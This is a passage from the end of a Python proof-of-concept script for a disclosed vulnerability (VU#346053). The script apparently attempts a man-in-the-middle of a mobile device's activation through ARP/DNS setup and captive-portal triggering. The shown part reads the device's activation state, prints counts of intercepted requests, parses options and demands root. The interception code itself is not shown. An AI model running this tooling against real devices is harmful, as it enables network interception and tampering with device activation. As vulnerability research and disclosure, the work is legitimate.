        if lockdown and not final_state:
            try:
                act = await lockdown.get_value(key="ActivationState")
                brick = await lockdown.get_value(key="BrickState")
                final_state = {
                    "ActivationState": act,
                    "BrickState": brick,
                }
            except Exception:
                pass

        report = generate_report(
            device_info, initial_state, final_state,
            usb_results, net_info)

        sm = report["summary"]
        print()
        print("=" * 62)
        print("  PoC Results")
        print("=" * 62)
        print(f"  HTTP requests received:        {sm['total_http_requests']}")
        print(f"    Captive portal triggers:     {sm['captive_portal_hits']}")
        print(f"    BAA requests served:         {sm['baa_requests_served']}")
        print(f"    Activation requests:         {sm['activation_requests']}")
        print(f"    DRM handshake requests:      {sm['handshake_requests']}")
        print(f"  HTTPS connection attempted:    {sm['https_attempted']}")
        print(f"  WebSheet probe reports:        {sm['websheet_reports']}")
        print(f"  Syslog activation hits:        {sm['syslog_hits']}")
        print(f"  Activation state changed:      {sm['state_changed']}")
        cp = report["captive_portal"]
        print(f"  Captive portal triggered:      {cp['triggered']}")
        print(f"  Captive portal total hits:     {cp['total_hits']}")
        print()
        if sm["state_changed"]:
            print("  *** ACTIVATION STATE CHANGED -- CHECK DEVICE ***")
        else:
            print("  Activation state did not change.")
            print("  (Expected: HTTPS cert validation blocks "
                  "activation MITM)")
        print()
        print(f"  Full report: {RESULTS_DIR}")
        print("=" * 62)
        print()

        return 0 if sm["state_changed"] else 1

    except Exception as e:
        log(f"Fatal error: {e}", "FATAL")
        import traceback
        traceback.print_exc()
        return 1

    finally:
        cleanup()


def main():
    parser = argparse.ArgumentParser(
        description="VU#346053 Captive Portal PoC -- USB Automated")
    parser.add_argument("--gateway", help="Gateway IP (auto-detect)")
    parser.add_argument("--iface", default="en0",
                        help="Network interface (default: en0)")
    parser.add_argument("--timeout", type=int, default=180,
                        help="Monitoring timeout in seconds (default: 180)")
    parser.add_argument("--captive-window", type=int, default=25,
                        help="Seconds to keep WebSheet open (default: 25)")
    parser.add_argument("--no-restart", action="store_true",
                        help="Skip device restart")
    parser.add_argument("--no-network", action="store_true",
                        help="Skip ARP/DNS setup (if already running)")
    parser.add_argument("--udid", help="Target device UDID")
    args = parser.parse_args()
    return asyncio.run(async_main(args))


# ===================================================================
# Entry Point
# ===================================================================

if __name__ == "__main__":
    if os.geteuid() != 0 and "--help" not in sys.argv and "-h" not in sys.argv:
        print(f"Root required. Run with:")
        print(f"  sudo {PYTHON312} {__file__}")
        sys.exit(1)
    sys.exit(main())
